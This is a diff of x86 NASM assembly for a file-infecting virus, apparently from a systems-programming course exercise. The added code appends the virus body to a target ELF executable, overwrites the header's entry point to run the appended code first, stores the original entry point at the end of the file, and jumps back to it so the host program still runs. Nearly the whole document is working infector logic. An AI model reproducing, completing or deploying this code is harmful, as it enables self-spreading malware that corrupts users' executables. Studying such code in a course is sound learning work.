@@ -79,9 +79,6 @@ anchor:
     pop edx
     ret
 
-msg: db "This is a virus", 10, 0
-msg_len EQU $ - msg - 1
-
 _start:
     %push
     push ebp
@@ -98,14 +95,16 @@ _start:
     %define %$mag ebp-16
     %define %$p_mag ebp-20
 
-    ; task 1 - NOTE: this overwrites task 0b variables
+    ; task 1 and forward - NOTE: this overwrites task 0b variables
     %define %$exe_code_start_vaddr ebp-16
-    %define %$elf_header ebp-(16+ELF_HEADER_SIZE)
-    %define %$p_elf_header ebp-(20+ELF_HEADER_SIZE)
+    %define %$exe_entry_point ebp-20
+    %define %$p_exe_entry_point ebp-24
+    %define %$elf_header ebp-(24+ELF_HEADER_SIZE)
+    %define %$p_elf_header ebp-(28+ELF_HEADER_SIZE)
 
     .print_msg:
-    get_lbl_loc [%$loc], msg
-    write stdout, [%$loc], msg_len
+    get_lbl_loc [%$loc], OutStr
+    write stdout, [%$loc], OutStr_len
 
     .open_elf_file:
     get_lbl_loc [%$loc], FileName
@@ -116,6 +115,9 @@ _start:
     jg .open_success
 
     .open_failed:
+    mov dword [ebp-8], eax
+    get_lbl_loc [%$loc], Failstr
+    write stdout, [%$loc], Failstr_len
     exit 1
 
     .open_success:
@@ -138,41 +140,52 @@ _start:
     .valid_elf_magic_number:
     jmp .end_check_elf_magic_number
     .invalid_elf_magic_number:
+    get_lbl_loc [%$loc], Failstr
+    write stdout, [%$loc], Failstr_len
     exit 2
     .end_check_elf_magic_number:
 
-    .seek_to_end:
+    .append_virus_code:
     seek_to_end [%$fd]
     mov [%$fsz], eax
-
-    .append_virus_code:
     get_lbl_loc [%$loc], virus_start
     write [%$fd], [%$loc], (virus_end - virus_start)
 
-    .seek_to_start_1:
-    seek_to_start [%$fd]
-
     .copy_elf_header:
+    seek_to_start [%$fd]
     lea eax, [%$elf_header]
     mov dword [%$p_elf_header], eax
     read [%$fd], [%$p_elf_header], ELF_HEADER_SIZE
 
-    .seek_to_start_2:
-    seek_to_start [%$fd]
+    .save_original_entry_point:
+        mov eax, dword [%$elf_header+ENTRY]
+        mov dword [%$exe_entry_point], eax
+        lea eax, [%$exe_entry_point]
+        mov dword [%$p_exe_entry_point], eax
 
     .change_entry_point:
     mov dword [%$exe_code_start_vaddr], 008048000h
+
+    seek_to_start [%$fd]
     mov eax, 0
     add eax, dword [%$exe_code_start_vaddr]
     add eax, dword [%$fsz]
     add eax, dword (_start - virus_start)
     mov dword [%$elf_header+ENTRY], eax
 
-    .write_ekf_header_back_to_file:
+    .write_elf_header_back_to_file:
     write [%$fd], [%$p_elf_header], ELF_HEADER_SIZE
+
+    .write_previous_entry_point:
+    lseek [%$fd], -4, SEEK_END
+    write [%$fd], [%$p_exe_entry_point], 4
 
     .close_file:
     close [%$fd]
+
+    .jump_to_previous_entry_point:    
+    get_lbl_loc PreviousEntryPoint
+    jmp [edx]
 
 VirusExit:
        exit 0 ; Termination if all is OK and no previous code to jump to
